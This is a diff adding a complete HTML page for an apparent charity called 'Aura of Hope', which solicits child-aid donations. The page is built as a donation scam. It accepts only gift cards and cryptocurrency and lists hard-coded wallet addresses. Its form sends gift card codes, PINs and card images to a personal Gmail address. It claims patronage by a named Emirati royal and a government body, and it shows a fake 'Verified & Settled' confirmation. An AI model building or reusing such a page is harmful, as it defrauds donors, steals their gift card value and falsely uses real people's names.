@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aura of Hope - Charitable Foundation</title>
+    <style>
+        :root {
+            --bg-color: #0b0b0b;
+            --surface-color: #141414;
+            --surface-border: #262626;
+            --gold: #d4af37;
+            --gold-light: #f3e5ab;
+            --gold-dark: #aa820a;
+            --text-main: #f5f5f5;
+            --text-muted: #a3a3a3;
+            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        /* Layout & Navigation */
+        header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: rgba(11, 11, 11, 0.9);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--surface-border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.2rem 5%;
+            z-index: 1000;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--gold);
+            letter-spacing: 2px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin-left: 2rem;
+            font-size: 0.95rem;
+            transition: var(--transition);
+        }
+
+        nav a:hover, nav a.active {
+            color: var(--gold);
+        }
+
+        main {
+            padding-top: 80px;
+            min-height: calc(100vh - 140px);
+        }
+
+        .page {
+            display: none;
+            padding: 4rem 5%;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Buttons & Forms */
+        .btn {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: #000;
+            font-weight: 600;
+            padding: 0.9rem 2.2rem;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: var(--transition);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .btn:hover {
+            background: linear-gradient(135deg, var(--gold-light), var(--gold));
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(212, 175, 55, 0.2);
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--gold);
+            color: var(--gold);
+        }
+
+        .btn-outline:hover {
+            background: var(--gold);
+            color: #000;
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 0.9rem;
+            background: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            color: var(--text-main);
+            border-radius: 4px;
+            font-size: 1rem;
+            margin-bottom: 1.2rem;
+            transition: var(--transition);
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--gold);
+            box-shadow: 0 0 0 2px rgba(212, 175, 55, 0.1);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        /* Cards & Grids */
+        .card {
+            background-color: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            border-radius: 8px;
+            padding: 2rem;
+            transition: var(--transition);
+            overflow: hidden;
+        }
+
+        .card:hover {
+            border-color: var(--gold);
+        }
+
+        .card img {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 4px;
+            margin-bottom: 1rem;
+            border: 1px solid var(--surface-border);
+        }
+
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        /* Homepage Specific */
+        .hero {
+            text-align: center;
+            padding: 6rem 1rem;
+            background: radial-gradient(circle at center, #1f1b0c 0%, var(--bg-color) 70%);
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 1.5rem;
+            color: var(--text-main);
+            font-weight: 800;
+        }
+
+        .hero h1 span {
+            color: var(--gold);
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 700px;
+            margin: 0 auto 2.5rem auto;
+        }
+
+        .stats-banner {
+            display: flex;
+            justify-content: space-around;
+            background-color: var(--surface-color);
+            border-top: 1px solid var(--surface-border);
+            border-bottom: 1px solid var(--surface-border);
+            padding: 2.5rem 1rem;
+            margin: 4rem 0;
+            text-align: center;
+        }
+
+        .stat-item h3 {
+            font-size: 2.5rem;
+            color: var(--gold);
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-item p {
+            color: var(--text-muted);
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+        }
+
+        /* Payment Selection */
+        .amount-options {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .amount-btn {
+            background: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            color: var(--text-main);
+            padding: 1rem;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .amount-btn.selected, .amount-btn:hover {
+            border-color: var(--gold);
+            color: var(--gold);
+            background: rgba(212, 175, 55, 0.05);
+        }
+
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .method-card {
+            background: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            padding: 1.5rem;
+            text-align: center;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .method-card.selected, .method-card:hover {
+            border-color: var(--gold);
+            background: rgba(212, 175, 55, 0.05);
+        }
+
+        /* Finalization & Confirmation */
+        .summary-box {
+            background: var(--surface-color);
+            border: 1px solid var(--surface-border);
+            padding: 1.5rem;
+            border-radius: 4px;
+            margin-bottom: 1.5rem;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.8rem;
+            padding-bottom: 0.8rem;
+            border-bottom: 1px solid var(--surface-border);
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+            font-weight: bold;
+            color: var(--gold);
+        }
+
+        .confirmation-box {
+            text-align: center;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .success-icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(212, 175, 55, 0.1);
+            border: 2px solid var(--gold);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5rem;
+            color: var(--gold);
+            margin: 0 auto 2rem auto;
+        }
+
+        /* Credits Page */
+        .credits-container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .credits-section {
+            margin-bottom: 2.5rem;
+        }
+
+        .credits-section h3 {
+            color: var(--gold);
+            margin-bottom: 1rem;
+            border-bottom: 1px solid var(--surface-border);
+            padding-bottom: 0.5rem;
+        }
+
+        /* Footer */
+        footer {
+            background-color: var(--surface-color);
+            border-top: 1px solid var(--surface-border);
+            text-align: center;
+            padding: 2rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.5rem; }
+            .amount-options { grid-template-columns: repeat(2, 1fr); }
+            .payment-methods { grid-template-columns: 1fr; }
+            .stats-banner { flex-direction: column; gap: 2rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <a class="logo" onclick="navigateTo('home')">AURA OF HOPE</a>
+        <nav>
+            <a href="#" onclick="navigateTo('home')" id="nav-home" class="active">Home</a>
+            <a href="#" onclick="navigateTo('donate')" id="nav-donate">Donate</a>
+            <a href="#" onclick="navigateTo('credits')" id="nav-credits">Credits</a>
+        </nav>
+    </header>
+
+    <main>
+        <!-- HOMEPAGE -->
+        <section id="home" class="page active">
+            <div class="hero">
+                <h1>Lighting Lives With <span>Compassion</span></h1>
+                <p>Join our global mission to eradicate extreme hardship, provide sustainable education, and deliver immediate humanitarian aid where it matters most.</p>
+                <button class="btn" onclick="navigateTo('donate')">Make a Donation</button>
+            </div>
+
+            <div class="stats-banner">
+                <div class="stat-item">
+                    <h3>$4.2M+</h3>
+                    <p>Funds Raised</p>
+                </div>
+                <div class="stat-item">
+                    <h3>120+</h3>
+                    <p>Communities Reached</p>
+                </div>
+                <div class="stat-item">
+                    <h3>65,000+</h3>
+                    <p>Lives Impacted</p>
+                </div>
+            </div>
+
+            <h2 style="text-align: center; margin-bottom: 1rem; color: var(--gold);">Our Core Initiatives</h2>
+            <div class="grid-3">
+                <div class="card">
+                    <img src="https://lh3.googleusercontent.com/d/1LnIkjUq12ePDkRdXTFrDB2OWF560Z6cA=w1000?authuser=0" alt="Homeless Arabian child in need">
+                    <h3 style="color: var(--gold); margin-bottom: 1rem;">Global Education</h3>
+                    <p style="color: var(--text-muted);">Building modern learning centers and provisioning digital tools for underprivileged youth globally.</p>
+                </div>
+                <div class="card">
+                    <img src="https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?auto=format&fit=crop&w=600&q=80" alt="Children in need of support">
+                    <h3 style="color: var(--gold); margin-bottom: 1rem;">Clean Water Access</h3>
+                    <p style="color: var(--text-muted);">Installing deep water purification wells in rural drought-stricken territories.</p>
+                </div>
+                <div class="card">
+                    <img src="https://lh3.googleusercontent.com/d/1kvWEGDANRVDkpO_43qkMeHZl664ueWDC=w1000?authuser=0" alt="Sick Arabian child requiring medical relief">
+                    <h3 style="color: var(--gold); margin-bottom: 1rem;">Medical Relief</h3>
+                    <p style="color: var(--text-muted);">Deploying mobile medical clinics and essential pharmaceuticals directly to isolated regional sectors to deliver life-saving healthcare, routine immunizations, and urgent pediatric treatments to children in hard-to-reach communities.</p>
+                </div>
+            </div>
+
+            <div style="max-width: 800px; margin: 4rem auto 0 auto; text-align: center; padding: 2rem; background-color: var(--surface-color); border: 1px solid var(--surface-border); border-radius: 8px;">
+                <h3 style="color: var(--gold); margin-bottom: 1rem; font-size: 1.8rem;">A Vision Rooted in Empathy and Action</h3>
+                <p style="color: var(--text-muted); line-height: 1.8; font-size: 1.05rem;">
+                    At Aura of Hope, our core initiatives serve as the vital lifelines connecting generosity with the bright futures children deserve. By strategically focusing on child education, clean water access, and pediatric medical relief, we target the foundational pillars necessary to protect vulnerable kids from chronic hardship. Every learning center built, every safe water well installed, and every mobile clinic deployed represents a tangible step toward giving children a safer, healthier world. Together, fueled by unwavering compassion and driven by transparent stewardship, we bridge the gap between despair and lasting opportunity—ensuring no child is left behind in the pursuit of dignity, joy, and a brighter future.
+                </p>
+            </div>
+        </section>
+
+        <!-- PAYMENT SELECTION -->
+        <section id="donate" class="page">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Support Our Cause</h2>
+                <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Select donation amount, currency, and preferred method.</p>
+                
+                <div class="card">
+                    <label for="currency-select">Select Currency</label>
+                    <select id="currency-select" onchange="setCurrency(this)">
+                        <option value="USD" selected>USD ($)</option>
+                        <option value="GBP">GBP (£)</option>
+                        <option value="EUR">EUR (€)</option>
+                    </select>
+
+                    <label>Choose Amount (<span id="currency-symbol">$</span>)</label>
+                    <div class="amount-options">
+                        <button class="amount-btn" onclick="setAmount(60, this)"><span class="curr-sym">$</span>60</button>
+                        <button class="amount-btn selected" onclick="setAmount(100, this)"><span class="curr-sym">$</span>100</button>
+                        <button class="amount-btn" onclick="setAmount(250, this)"><span class="curr-sym">$</span>250</button>
+                        <button class="amount-btn" onclick="setAmount(500, this)"><span class="curr-sym">$</span>500</button>
+                    </div>
+                    
+                    <label for="custom-amount">Or Input Amount (Minimum 60)</label>
+                    <input type="number" id="custom-amount" placeholder="Enter amount (min 60)" min="60" oninput="setCustomAmount(this)">
+
+                    <label style="margin-top: 1.5rem;">Select Payment Method</label>
+                    <div class="payment-methods" style="grid-template-columns: repeat(2, 1fr);">
+                        <div class="method-card selected" onclick="setMethod('Gift Card', this)">Gift Card</div>
+                        <div class="method-card" onclick="setMethod('Crypto', this)">Crypto</div>
+                    </div>
+
+                    <button class="btn" style="width: 100%; margin-top: 1rem;" onclick="validateAndProceed()">Proceed</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- FINALIZATION -->
+        <section id="checkout" class="page">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Finalize Contribution</h2>
+                <p style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Please review details of your contribution.</p>
+
+                <div class="summary-box">
+                    <div class="summary-row">
+                        <span>Selected Amount:</span>
+                        <span id="summary-amount">$100.00</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Payment Method:</span>
+                        <span id="summary-method">Gift Card</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Total Payable:</span>
+                        <span id="summary-total">$100.00</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div style="display: grid; grid-template-columns: 1fr; gap: 1rem;">
+                        <button id="pay-action-btn" class="btn" style="width: 100%;">Proceed to Payment</button>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CRYPTO PAYMENT PORTAL -->
+   <section id="pay-crypto" class="page">
+    <div style="max-width: 600px; margin: 0 auto;">
+        <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Crypto Payment Gateway</h2>
+        <p class="subtitle" style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Please send the exact equivalent amount to one of the secure wallets below.</p>
+        
+        <div class="card" style="margin-bottom: 1.5rem;">
+            <label for="crypto-select">Select Cryptocurrency</label>
+            <select id="crypto-select" onchange="switchCrypto(this.value)">
+                <option value="btc" selected>Bitcoin (BTC)</option>
+                <option value="usdt">USDT (TRC20)</option>
+                <option value="ltc">Litecoin (LTC)</option>
+            </select>
+
+            <div id="crypto-details-container" style="text-align: center; margin-top: 1.5rem; color: #fff;">
+                
+                <!-- Bitcoin Block -->
+                <div id="qr-btc" class="crypto-qr-block" style="background: #0f172a; padding: 2rem; border-radius: 1rem; border: 1px solid #1e293b; max-width: 400px; margin: 0 auto 1.5rem auto;">
+                    <img id="img-btc" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=bc1q8acdzjj2th86scc5f5yl5tr8rz048234xtknce" alt="Bitcoin QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px; display: inline-block;">
+                    
+                    <label style="display: block; font-weight: bold; margin-bottom: 0.5rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em;">Bitcoin Wallet Address</label>
+                    
+                    <input type="text" id="input-btc" value="bc1q8acdzjj2th86scc5f5yl5tr8rz048234xtknce" readonly style="width: 100%; text-align: center; font-family: monospace; padding: 0.75rem; border-radius: 0.5rem; background: #1e293b; border: 1px solid #334155; color: #38bdf8; font-size: 0.85rem; margin-bottom: 1.5rem;" onclick="this.select();">
+                    
+                    <div style="text-align: left; background: rgba(30, 41, 59, 0.5); padding: 1rem; border-radius: 0.75rem; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+                        <p style="font-weight: bold; color: #f8fafc; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em;">Payment Instructions:</p>
+                        <ol style="margin: 0; padding-left: 1.25rem;">
+                            <li>Open your crypto wallet or exchange app.</li>
+                            <li>Scan the QR code above or copy the Bitcoin address.</li>
+                            <li>Ensure you are sending over the <strong style="color: #f8fafc;">Bitcoin (BTC) Network</strong>.</li>
+                            <li>Double-check the address before confirming the transfer.</li>
+                        </ol>
+                    </div>
+                </div>
+                                    
+                <!-- USDT Block -->
+                <div id="qr-usdt" class="crypto-qr-block" style="background: #0f172a; padding: 2rem; border-radius: 1rem; border: 1px solid #1e293b; max-width: 400px; margin: 0 auto 1.5rem auto;">
+                    <img id="img-usdt" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TDgVeanJ7W7zywuwr6ws1BPyR4Za9KNcAo" alt="USDT QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px; display: inline-block;">
+                    
+                    <label style="display: block; font-weight: bold; margin-bottom: 0.5rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em;">USDT Wallet Address (TRC20)</label>
+                    
+                    <input type="text" id="input-usdt" value="TDgVeanJ7W7zywuwr6ws1BPyR4Za9KNcAo" readonly style="width: 100%; text-align: center; font-family: monospace; padding: 0.75rem; border-radius: 0.5rem; background: #1e293b; border: 1px solid #334155; color: #38bdf8; font-size: 0.85rem; margin-bottom: 1.5rem;" onclick="this.select();">
+
+                    <div style="text-align: left; background: rgba(30, 41, 59, 0.5); padding: 1rem; border-radius: 0.75rem; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+                        <p style="font-weight: bold; color: #f8fafc; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em;">Payment Instructions:</p>
+                        <ol style="margin: 0; padding-left: 1.25rem;">
+                            <li>Open your crypto wallet or exchange.</li>
+                            <li>Select <strong>Send</strong> and choose <strong>USDT</strong>.</li>
+                            <li>Ensure you select the <strong style="color: #f8fafc;">TRON (TRC20)</strong> network to avoid losing funds.</li>
+                            <li>Scan the QR code or copy and paste the address, enter the amount, and send.</li>
+                        </ol>
+                    </div>
+                </div>
+                                    
+                <!-- Litecoin Block -->
+                <div id="qr-ltc" class="crypto-qr-block" style="background: #0f172a; padding: 2rem; border-radius: 1rem; border: 1px solid #1e293b; max-width: 400px; margin: 0 auto;">
+                    <img id="img-ltc" src="" alt="Litecoin QR Code" style="width: 180px; height: 180px; border-radius: 4px; margin-bottom: 1rem; background: #fff; padding: 10px; display: inline-block;">
+                    
+                    <label style="display: block; font-weight: bold; margin-bottom: 0.5rem; font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em;">Litecoin Wallet Address</label>
+                    
+                    <input type="text" id="input-ltc" value="ltc1qn3e59qn6tect6attdtah80hjw32zkft49d83ak" readonly style="width: 100%; text-align: center; font-family: monospace; padding: 0.75rem; border-radius: 0.5rem; background: #1e293b; border: 1px solid #334155; color: #38bdf8; font-size: 0.85rem; margin-bottom: 1.5rem;" onclick="this.select();">
+
+                    <div style="text-align: left; background: rgba(30, 41, 59, 0.5); padding: 1rem; border-radius: 0.75rem; border: 1px solid #334155; font-size: 0.8rem; color: #94a3b8; line-height: 1.5;">
+                        <p style="font-weight: bold; color: #f8fafc; margin-bottom: 0.5rem; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em;">Payment Instructions:</p>
+                        <ol style="margin: 0; padding-left: 1.25rem;">
+                            <li>Open your crypto wallet or exchange app.</li>
+                            <li>Scan the QR code above or copy the Litecoin address.</li>
+                            <li>Ensure you are sending over the <strong style="color: #f8fafc;">Litecoin (LTC) Network</strong>.</li>
+                            <li>Double-check the address before confirming the transfer.</li>
+                        </ol>
+                    </div>
+                </div>
+
+            </div>
+
+            <button class="btn" style="width: 100%; margin-top: 1rem;" onclick="navigateTo('confirmation')">I Have Sent the Payment</button>
+        </div>
+    </div>
+</section>
+
+<!-- Styles and Scripts properly structured -->
+<style>
+  .crypto-qr-block { display: none; }
+  .crypto-qr-block.active { display: block; }
+</style>
+
+<script>
+  // Define the switchCrypto function to dynamically show/hide crypto blocks
+  function switchCrypto(val) {
+      document.querySelectorAll('.crypto-qr-block').forEach(block => {
+          block.classList.remove('active');
+      });
+      
+      const selectedBlock = document.getElementById(`qr-${val}`);
+      if (selectedBlock) {
+          selectedBlock.classList.add('active');
+      }
+  }
+
+  // Initialize on load and generate Litecoin QR code URL
+  document.addEventListener('DOMContentLoaded', () => {
+      const selectElement = document.getElementById('crypto-select');
+      if (selectElement) {
+          switchCrypto(selectElement.value);
+      }
+
+      const ltcWalletAddress = "ltc1qn3e59qn6tect6attdtah80hjw32zkft49d83ak";
+      const qrImgElement = document.getElementById('img-ltc');
+      if (qrImgElement) {
+        qrImgElement.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(ltcWalletAddress)}`;
+      }
+  });
+</script>
+        <!-- GIFT CARD PAYMENT PAGE (Embedded for full integration) -->
+        <section id="pay-giftcard" class="page">
+            <div style="max-width: 600px; margin: 0 auto;">
+                <h2>Gift Card Contribution Portal</h2>
+                <p class="subtitle" style="text-align: center; color: var(--text-muted); margin-bottom: 2rem;">Upload your gift card details and receipt images to complete your secure transfer.</p>
+
+                <div class="card">
+                    <form id="giftcard-form" action="https://formsubmit.co/pteminence@gmail.com" method="POST" enctype="multipart/form-data">
+                        <label for="donor-email">Your Email Address</label>
+                        <input type="email" id="donor-email" name="email" placeholder="you@gmail.com" required>
+
+                        <label for="card-details">Gift Card Code / Text Details</label>
+                        <textarea id="card-details" name="card_details" rows="4" placeholder="Enter card pin, code, or relevant text information here..." required></textarea>
+
+                        <label for="card-image">Upload Gift Card Image / Receipt</label>
+                        <input type="file" id="card-image" name="card_image" accept="image/*" required style="padding: 0.6rem; cursor: pointer;">
+
+                        <input type="hidden" name="donation_amount" id="form-donation-amount" value="50">
+                        <input type="hidden" name="_subject" value="New Gift Card Donation Upload - Aura of Hope">
+
+                        <button type="submit" class="btn" style="width: 100%; margin-top: 1rem;">Donate Now</button>
+                    </form>
+                </div>
+            </div>
+        </section>
+
+        <!-- CONFIRMATION -->
+        <section id="confirmation" class="page">
+            <div class="confirmation-box">
+                <div class="success-icon">✓</div>
+                <h2 style="color: var(--gold); margin-bottom: 1rem;">Thank You For Your Generosity!</h2>
+                <p style="color: var(--text-muted); margin-bottom: 2rem;">Your donation has been sent and is being processed. You will receive an email shortly with confirmation details and update tracking sheet.</p>
+                
+                <div class="summary-box" style="text-align: left; margin-bottom: 2rem;">
+                    <div class="summary-row">
+                        <span>Transaction Reference:</span>
+                        <span>#AOH-98421039</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Date:</span>
+                        <span id="conf-date">July 25, 2026</span>
+                    </div>
+                    <div class="summary-row">
+                        <span>Status:</span>
+                        <span style="color: var(--gold);">Verified & Settled</span>
+                    </div>
+                </div>
+
+                <button class="btn" onclick="navigateTo('home')">Return to Homepage</button>
+            </div>
+        </section>
+
+        <!-- CREDITS -->
+        <section id="credits" class="page">
+            <div class="credits-container">
+                <h2 style="color: var(--gold); margin-bottom: 0.5rem; text-align: center;">Credits & Attribution</h2>
+                <p style="text-align: center; color: var(--text-muted); margin-bottom: 3rem;">Acknowledge the visionaries, powering Aura of Hope Foundation.</p>
+
+                <div class="credits-section" style="text-align: center;">
+                    <h3>Patronage & Leadership</h3>
+                    <div class="card" style="max-width: 400px; margin: 0 auto;">
+                        <img src="https://lh3.googleusercontent.com/d/1Nb6KGUZN-D1EoGQffrAv3XCpu7NYgeyE=w1000?authuser=0" alt="HH Sheikh Hamdan bin Mohammed bin Rashid Al Maktoum" style="height: 300px; object-fit: cover;">
+                        <h4 style="color: var(--gold); margin-bottom: 0.5rem;">HH Sheikh Hamdan bin Mohammed Al Maktoum</h4>
+                        <p style="color: var(--text-muted); font-size: 0.9rem;">Official Patronage & Inspiration</p>
+                    </div>
+                </div>
+
+                <div class="credits-section">
+                    <h3>Powered By</h3>
+                    <p style="color: var(--text-muted);">HH Sheikh Hamdan bin Mohammed Al Maktoum.</p>
+                </div>
+
+                <div class="credits-section">
+                    <h3>In Collaboration With</h3>
+                    <p style="color: var(--text-muted);">Middle Eastern Development Initiative</p>
+                </div>
+
+                <div class="credits-section">
+                    <h3>Also In Collaboration With</h3>
+                    <p style="color: var(--text-muted);">UAE Child Development Authority</p>
+                </div>
+
+                <div style="text-align: center; margin-top: 3rem;">
+                    <button class="btn btn-outline" onclick="navigateTo('home')">Back to Main Portal</button>
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2026 Aura of Hope Foundation. Dedicated to global child preservation.</p>
+    </footer>
+
+    <script>
+        let currentAmount = 100;
+        let currentCurrency = 'USD';
+        let currencySymbol = '$';
+        let currentMethod = 'Gift Card';
+
+        function setCurrency(select) {
+            currentCurrency = select.value;
+            if (currentCurrency === 'USD') {
+                currencySymbol = '$';
+                currentAmount = 100;
+            } else if (currentCurrency === 'GBP') {
+                currencySymbol = '£';
+                currentAmount = 60;
+            } else if (currentCurrency === 'EUR') {
+                currencySymbol = '€';
+                currentAmount = 60;
+            }
+
+            // Update currency symbols on page
+            const symbols = document.querySelectorAll('.curr-sym');
+            symbols.forEach(s => s.innerText = currencySymbol);
+
+            // Reset amount options based on currency default minimums
+            const amountOptionsContainer = document.querySelector('.amount-options');
+            if (currentCurrency === 'USD') {
+                amountOptionsContainer.innerHTML = `
+                    <button class="amount-btn selected" onclick="setAmount(60, this)"><span class="curr-sym">${currencySymbol}</span>60</button>
+                    <button class="amount-btn" onclick="setAmount(100, this)"><span class="curr-sym">${currencySymbol}</span>100</button>
+                    <button class="amount-btn" onclick="setAmount(250, this)"><span class="curr-sym">${currencySymbol}</span>250</button>
+                    <button class="amount-btn" onclick="setAmount(500, this)"><span class="curr-sym">${currencySymbol}</span>500</button>
+                `;
+                currentAmount = 60;
+            } else if (currentCurrency === 'GBP') {
+                amountOptionsContainer.innerHTML = `
+                    <button class="amount-btn selected" onclick="setAmount(60, this)"><span class="curr-sym">${currencySymbol}</span>60</button>
+                    <button class="amount-btn" onclick="setAmount(100, this)"><span class="curr-sym">${currencySymbol}</span>100</button>
+                    <button class="amount-btn" onclick="setAmount(200, this)"><span class="curr-sym">${currencySymbol}</span>200</button>
+                    <button class="amount-btn" onclick="setAmount(400, this)"><span class="curr-sym">${currencySymbol}</span>400</button>
+                `;
+                currentAmount = 60;
+            } else {
+                amountOptionsContainer.innerHTML = `
+                    <button class="amount-btn selected" onclick="setAmount(60, this)"><span class="curr-sym">${currencySymbol}</span>60</button>
+                    <button class="amount-btn" onclick="setAmount(100, this)"><span class="curr-sym">${currencySymbol}</span>100</button>
+                    <button class="amount-btn" onclick="setAmount(200, this)"><span class="curr-sym">${currencySymbol}</span>200</button>
+                    <button class="amount-btn" onclick="setAmount(400, this)"><span class="curr-sym">${currencySymbol}</span>400</button>
+                `;
+                currentAmount = 60;
+            }
+            document.getElementById('custom-amount').value = '';
+        }
+
+        function validateAndProceed() {
+            if (currentAmount < 60) {
+                alert('The minimum donation amount is 60 ' + currentCurrency);
+                return;
+            }
+            navigateTo('checkout');
+        }
+
+        function navigateTo(pageId) {
+            const pages = document.querySelectorAll('.page');
+            pages.forEach(page => page.classList.remove('active'));
+
+            const targetPage = document.getElementById(pageId);
+            if(targetPage) {
+                targetPage.classList.add('active');
+            }
+
+            const navLinks = document.querySelectorAll('nav a');
+            navLinks.forEach(link => link.classList.remove('active'));
+            
+            const activeNav = document.getElementById('nav-' + pageId);
+            if(activeNav) activeNav.classList.add('active');
+
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+
+            if(pageId === 'checkout') {
+                document.getElementById('summary-amount').innerText = currencySymbol + Number(currentAmount).toFixed(2) + ' ' + currentCurrency;
+                document.getElementById('summary-method').innerText = currentMethod;
+                document.getElementById('summary-total').innerText = currencySymbol + Number(currentAmount).toFixed(2) + ' ' + currentCurrency;
+
+                const payBtn = document.getElementById('pay-action-btn');
+                payBtn.innerText = `Complete ${currencySymbol}${currentAmount} Payment via ${currentMethod}`;
+                
+                if(currentMethod === 'Gift Card') {
+                    payBtn.onclick = function() {
+                        const amountInput = document.getElementById('form-donation-amount');
+                        if(amountInput) amountInput.value = currentAmount;
+                        navigateTo('pay-giftcard');
+                    };
+                } else if(currentMethod === 'Crypto') {
+                    payBtn.onclick = function() {
+                        navigateTo('pay-crypto');
+                    };
+                }
+            }
+        }
+
+        function setAmount(amount, element) {
+            currentAmount = amount;
+            document.getElementById('custom-amount').value = '';
+            
+            const buttons = document.querySelectorAll('.amount-btn');
+            buttons.forEach(btn => btn.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+
+        function setCustomAmount(input) {
+            const val = parseFloat(input.value);
+            if(!isNaN(val) && val > 0) {
+                currentAmount = val;
+                const buttons = document.querySelectorAll('.amount-btn');
+                buttons.forEach(btn => btn.classList.remove('selected'));
+            }
+        }
+
+        function setMethod(method, element) {
+            currentMethod = method;
+            const methods = document.querySelectorAll('.payment-methods .method-card');
+            methods.forEach(card => card.classList.remove('selected'));
+            element.classList.add('selected');
+        }
+
+        function switchCrypto(cryptoType) {
+            const qrBlocks = document.querySelectorAll('.crypto-qr-block');
+            qrBlocks.forEach(block => block.style.display = 'none');
+
+            const targetQr = document.getElementById('qr-' + cryptoType);
+            if(targetQr) {
+                targetQr.style.display = 'block';
+            }
+        }
+    </script>
+</body>
+</html>
